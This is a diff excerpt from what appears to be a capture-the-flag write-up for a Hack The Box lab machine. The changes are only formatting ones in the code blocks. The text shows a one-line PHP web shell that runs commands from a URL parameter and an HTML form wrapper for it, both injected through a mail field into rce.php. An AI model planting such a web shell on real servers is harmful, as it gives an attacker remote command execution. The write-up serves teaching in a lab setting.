@@ -42,23 +42,17 @@ relations@moi.gov.htb -X/var/www/html/rce.php
 
 Our payload will be a makeshift PHP shell, which we enter into the "Subject" field. The following line would be sufficient:
 
-```
+``` php
 <?php system($_GET["cmd"]); ?>
 ```
 
 However, this is not very comfortable. We therefore improve the code to include a text field for entering commands and which formats the output:
 
-```
+``` html
 <hr />
 <form action="rce.php" method="get">
-  <input type="text" 
-    id="cmd" 
-    name="cmd" 
-    value='<?php print($_GET["cmd"]); ?>' 
-    autofocus 
-    onfocus="var temp_value=this.value; 
-      this.value=''; 
-      this.value=temp_value" />
+  <input type="text" id="cmd" name="cmd" value='<?php print($_GET["cmd"]); ?>' autofocus 
+    onfocus="var temp_value=this.value; this.value=''; this.value=temp_value" />
 </form>
 <hr />
 <pre>
